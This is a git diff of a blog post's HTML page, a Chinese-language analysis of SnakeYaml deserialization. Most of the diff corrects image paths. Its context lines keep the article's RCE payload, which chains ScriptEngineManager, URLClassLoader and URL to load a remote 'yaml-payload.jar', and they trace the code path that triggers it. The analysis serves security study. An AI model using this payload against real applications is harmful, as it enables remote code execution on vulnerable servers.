@@ -26,24 +26,24 @@
 <meta property="og:site_name" content="EddieMurphy&#39;s blog">
 <meta property="og:description" content="SnakeYaml也算是常见的包，在之前打题的时候遇到过，国决java题两道solon也有这个包。 前言SnakeYaml是一个完整的YAML1.1规范Processor，用于解析YAML，序列化以及反序列化，支持UTF-8&#x2F;UTF-16，支持Java对象的序列化&#x2F;反序列化，支持所有YAML定义的类型。 Basic Practice依赖如下： 12345&lt;dependen">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/CISCN2024-Final-AWDP-Fobee/021356.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/CISCN2024-Final-AWDP-Fobee/059167.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/CISCN2024-Final-AWDP-Fobee/133518.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/CISCN2024-Final-AWDP-Fobee/442837.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/CISCN2024-Final-AWDP-Fobee/716142.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/CISCN2024-Final-AWDP-Fobee/110646.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/CISCN2024-Final-AWDP-Fobee/215536.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/CISCN2024-Final-AWDP-Fobee/327831.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/CISCN2024-Final-AWDP-Fobee/346497.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/CISCN2024-Final-AWDP-Fobee/404381.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/CISCN2024-Final-AWDP-Fobee/418302.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/CISCN2024-Final-AWDP-Fobee/529534.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/SnakeYaml/image-20240803154021356.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/SnakeYaml/image-20240803154059167.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/SnakeYaml/image-20240803154133518.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/SnakeYaml/image-20240803154442837.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/SnakeYaml/image-20240803154716142.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/SnakeYaml/image-20240803155110646.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/SnakeYaml/image-20240803155215536.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/SnakeYaml/image-20240803155327831.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/SnakeYaml/image-20240803155346497.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/SnakeYaml/image-20240803155404381.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/SnakeYaml/image-20240803155418302.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/03/SnakeYaml/image-20240803155529534.png">
 <meta property="article:published_time" content="2024-08-03T06:15:06.000Z">
 <meta property="article:modified_time" content="2024-08-03T07:56:55.798Z">
 <meta property="article:author" content="EddieMurphy">
 <meta property="article:tag" content="Java">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://eddiemurphy89.github.io/2024/07/28/CISCN2024-Final-AWDP-Fobee/021356.png">
+<meta name="twitter:image" content="https://eddiemurphy89.github.io/2024/08/03/SnakeYaml/image-20240803154021356.png">
   
   
   
@@ -351,16 +351,16 @@
 <blockquote>
 <p>!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [“<a target="_blank" rel="noopener" href="http://127.0.0.1:9999/yaml-payload.jar%22]">http://127.0.0.1:9999/yaml-payload.jar&quot;]</a> ]] ]</p>
 </blockquote>
-<p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/021356.png" srcset="/img/loading.gif" lazyload alt="image-20240803154021356"></p>
+<p><img src="/2024/08/03/SnakeYaml/image-20240803154021356.png" srcset="/img/loading.gif" lazyload alt="image-20240803154021356"></p>
 <p>触发流程如下：</p>
 <p><code>javax.script.ScriptEngineManager</code></p>
-<p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/059167.png" srcset="/img/loading.gif" lazyload alt="image-20240803154059167"></p>
-<p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/133518.png" srcset="/img/loading.gif" lazyload alt="image-20240803154133518"></p>
+<p><img src="/2024/08/03/SnakeYaml/image-20240803154059167.png" srcset="/img/loading.gif" lazyload alt="image-20240803154059167"></p>
+<p><img src="/2024/08/03/SnakeYaml/image-20240803154133518.png" srcset="/img/loading.gif" lazyload alt="image-20240803154133518"></p>
 <p><code>ScriptEngineManager</code>的无参构造器调用了init()，进行初始化设置后调用<code>initEngines()</code>，用于初始化脚本引擎。</p>
 <p>接着到<code>getServiceLoader</code>，用于获取<code>ServiceLoader</code>迭代器</p>
-<p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/442837.png" srcset="/img/loading.gif" lazyload alt="image-20240803154442837"></p>
+<p><img src="/2024/08/03/SnakeYaml/image-20240803154442837.png" srcset="/img/loading.gif" lazyload alt="image-20240803154442837"></p>
 <p>到了熟悉的<code>ServiceLoader.load()</code>返回一个<code>ServiceLoader&lt;T&gt;</code>，根据这个可以获取一个迭代器，接下来还是熟悉的迭代遍历。</p>
-<p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/716142.png" srcset="/img/loading.gif" lazyload alt="image-20240803154716142"></p>
+<p><img src="/2024/08/03/SnakeYaml/image-20240803154716142.png" srcset="/img/loading.gif" lazyload alt="image-20240803154716142"></p>
 <p><code>next() =&gt; nextService()</code>会加载接口实现类并实例化，网上有详解。</p>
 <h3 id="SpringFramework远程加载配置"><a href="#SpringFramework远程加载配置" class="headerlink" title="SpringFramework远程加载配置"></a>SpringFramework远程加载配置</h3><p>Spring当中有两个类的构造函数远程加载配置，可以构成RCE</p>
 <blockquote>
@@ -385,12 +385,12 @@
 <h2 id="Yaml-load"><a href="#Yaml-load" class="headerlink" title="Yaml#load()"></a>Yaml#load()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">load</span><span class="hljs-params">(String yaml)</span> &#123;<br>	<span class="hljs-keyword">return</span> (T) loadFromReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamReader</span>(yaml), Object.class);<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>payload存储于StreamReader的stream字段：</p>
-<p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/110646.png" srcset="/img/loading.gif" lazyload alt="image-20240803155110646"></p>
+<p><img src="/2024/08/03/SnakeYaml/image-20240803155110646.png" srcset="/img/loading.gif" lazyload alt="image-20240803155110646"></p>
 <p>回到<code>loadFromReader()</code>，创建了一个Composer对象，并封装到<code>constructor</code>中：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">loadFromReader</span><span class="hljs-params">(StreamReader sreader, Class&lt;?&gt; type)</span> &#123;<br>    <span class="hljs-type">Composer</span> <span class="hljs-variable">composer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Composer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ParserImpl</span>(sreader), resolver, loadingConfig);<br>    constructor.setComposer(composer);<br>    <span class="hljs-keyword">return</span> constructor.getSingleData(type);<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>跟进<code>getSingleData</code>：</p>
-<p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/215536.png" srcset="/img/loading.gif" lazyload alt="image-20240803155215536"></p>
+<p><img src="/2024/08/03/SnakeYaml/image-20240803155215536.png" srcset="/img/loading.gif" lazyload alt="image-20240803155215536"></p>
 <p><code>getSingleNode()</code>将poc改造为如下：</p>
 <blockquote>
 <p>&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:javax.script.ScriptEngineManager, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:java.net.URLClassLoader, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:seq, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:java.net.URL, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.ScalarNode (tag&#x3D;tag:yaml.org,2002:str, value&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1:9999/yaml-payload.jar)%3E])%3E])%3E])%3E])%3E">http://127.0.0.1:9999/yaml-payload.jar)&gt;])&gt;])&gt;])&gt;])&gt;</a></p>
@@ -399,12 +399,12 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">!tag:yaml.org,<span class="hljs-number">2002</span>:javax.script.ScriptEngineManager [!tag:yaml.org,<span class="hljs-number">2002</span>:java.net.URLClassLoader [[!tag:yaml.org,<span class="hljs-number">2002</span>:java.net.URL [<span class="hljs-string">&quot;http://ip/yaml-payload.jar&quot;</span>]]]]<br></code></pre></td></tr></table></figure>
 
 <p>接着调用<code>constructDocument()</code>对上面poc进行处理：</p>
-<p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/327831.png" srcset="/img/loading.gif" lazyload alt="image-20240803155327831"></p>
+<p><img src="/2024/08/03/SnakeYaml/image-20240803155327831.png" srcset="/img/loading.gif" lazyload alt="image-20240803155327831"></p>
 <p>跟进<code>constructObject()</code> &#x3D;&gt; <code>constructObjectNoCheck()</code>：</p>
-<p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/346497.png" srcset="/img/loading.gif" lazyload alt="image-20240803155346497"></p>
+<p><img src="/2024/08/03/SnakeYaml/image-20240803155346497.png" srcset="/img/loading.gif" lazyload alt="image-20240803155346497"></p>
 <p>node放入<code>recursiveObjects</code>，进入<code>constructor.construct(node)</code>：</p>
-<p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/404381.png" srcset="/img/loading.gif" lazyload alt="image-20240803155404381"></p>
-<p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/418302.png" srcset="/img/loading.gif" lazyload alt="image-20240803155418302"></p>
+<p><img src="/2024/08/03/SnakeYaml/image-20240803155404381.png" srcset="/img/loading.gif" lazyload alt="image-20240803155404381"></p>
+<p><img src="/2024/08/03/SnakeYaml/image-20240803155418302.png" srcset="/img/loading.gif" lazyload alt="image-20240803155418302"></p>
 <p>遍历节点，调用<code>constructObject()</code>又循环回去了</p>
 <blockquote>
 <p>constructObjectNoCheck()-&gt;</p>
@@ -416,7 +416,7 @@
 <p>先后进行了URL、URLClassLoader、ScriptEngineManager的实例化</p>
 <p>注意这里实例化是有传参数(argumentList)的，把前一个类的实例化对象当作下个类构造器的参数。</p>
 <p>最后进入ScriptEngineManager的无参构造器，连接上了上文的SPI机制。</p>
-<p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/529534.png" srcset="/img/loading.gif" lazyload alt="image-20240803155529534"></p>
+<p><img src="/2024/08/03/SnakeYaml/image-20240803155529534.png" srcset="/img/loading.gif" lazyload alt="image-20240803155529534"></p>
 <p>参考：</p>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247496898&idx=1&sn=9df9a236a3c437522bdf125cf92c6e24&chksm=c172e553f6056c4592696a15d5270e30386a229ca35d8eb1cf588498c95d78b28f2766975234&scene=27&key=7917b196593e1041903cc963f4d8e8dd309fc34822ec523c96ef6852b6eb00243ae09c3a475f21000c466a1481f5d9ef88661e5ccd3eae00b654271eecd790081cf9cb2b874e0566a9b1bf83ab3e3a9dffbce029a9983bd1e617a34873e1a5cf0d90ff63073904c1c64a7ab0832fd5396612ac69385a93896810c27b3466f6ca&ascene=0&uin=MzM0MTE3MTk2MQ==&devicetype=Windows+10+x64&version=6308011a&lang=zh_CN&exportkey=n_ChQIAhIQk1l7Og6o32ldfRBgt0m/7xLgAQIE97dBBAEAAAAAAFyoNDyY7FgAAAAOpnltbLcz9gKNyK89dVj0STE6v0lILRu1tKDn0ZDKVMzBwrLXZCB+mUzHXSOZsIYr0w0A/cuvTqwms4Rt/kjpf8zHxxTi8IwvjYn/DZ9Q33Hc5vfX2hilkR53helcExsLrLyslL/WBsef9XI/6wZMWmG6oy8JJGplsmLrW+xqvmnB4f5wILv176CzXoS3esuvsQ+hfcDKd/Efu5bUKYhs0ZoGh1vCyZD6VtP9NEg2tTCVHV3tJAqerIo+gJoEHIoL7rOFzs/q0qic&acctmode=0&pass_ticket=Q7/iUlx9i6XS/NSi17wpXoqBYZHAHgY0basv8D4BZIN+CoAkTfFeOqqNDBcbXW05phWaLHgqOHGN8cecKlsdgw==&wx_header=1&fontgear=2">SnakeYaml反序列化及不出网利用</a></p>
 <p><a target="_blank" rel="noopener" href="https://p4d0rn.gitbook.io/java/serial-journey/snakeyaml">SnakeYaml | Java (gitbook.io)</a></p>
@@ -488,6 +488,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/" title="从巅峰极客2023Baby_URL看二次反序列化和Jackson原生链">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">从巅峰极客2023Baby_URL看二次反序列化和Jackson原生链</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
